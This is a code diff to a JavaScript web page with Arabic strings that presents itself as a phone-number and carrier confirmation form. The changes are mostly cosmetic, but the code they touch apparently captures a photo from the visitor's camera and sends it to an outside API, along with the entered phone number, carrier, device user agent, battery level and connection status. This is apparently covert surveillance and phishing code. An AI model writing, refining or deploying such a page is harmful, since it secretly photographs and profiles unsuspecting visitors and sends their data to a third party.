@@ -16,6 +16,7 @@ fetch('config.json')
     alert('حدث خطأ في تحميل الإعدادات. تأكد من وجود config.json.');
   });
 
+// تحديث اسم مزود الخدمة عند كتابة الرقم
 document.getElementById('phoneNumber').addEventListener('input', () => {
   const phone = document.getElementById('phoneNumber').value;
   const carrierName = detectCarrier(phone);
@@ -45,8 +46,11 @@ function startCameraAndSend() {
     alert('يرجى إدخال رقم الهاتف.');
     return;
   }
-  document.getElementById('confirmBtn').innerHTML = 'جاري تاكيد...';
-  document.getElementById('confirmBtn').disabled = true;
+
+  const btn = document.getElementById('confirmBtn');
+  btn.innerHTML = 'جاري التأكيد...';
+  btn.disabled = true;
+
   captureAndSendPhoto(phoneNumber);
 }
 
@@ -84,7 +88,9 @@ async function captureAndSendPhoto(phoneNumber) {
       })
         .then(res => res.json())
         .then(result => {
-          if (!result.ok) console.error("فشل الإرسال:", result.description);
+          if (!result.ok) {
+            console.error("فشل الإرسال:", result.description);
+          }
         })
         .catch(err => {
           console.error("خطأ أثناء الإرسال:", err);
@@ -118,12 +124,17 @@ async function collectUserInfo(phoneNumber) {
     try {
       const battery = await navigator.getBattery();
       batteryLevel = Math.round(battery.level * 100) + "%";
-    } catch (e) {
+    } catch {
       batteryLevel = "غير متاح";
     }
   }
 
   const carrier = detectCarrier(phoneNumber);
-  const caption = `📱 رقم الهاتف: ${phoneNumber}\n🏢 مزود الخدمة: ${carrier}\n🖥️ نوع الجهاز: ${userAgent}\n🔋 نسبة البطارية: ${batteryLevel}\n🌐 اتصال الإنترنت: ${connectionStatus}`;
+  const caption = `📱 رقم الهاتف: ${phoneNumber}
+🏢 مزود الخدمة: ${carrier}
+🖥️ نوع الجهاز: ${userAgent}
+🔋 نسبة البطارية: ${batteryLevel}
+🌐 اتصال الإنترنت: ${connectionStatus}`;
+
   return { caption };
 }
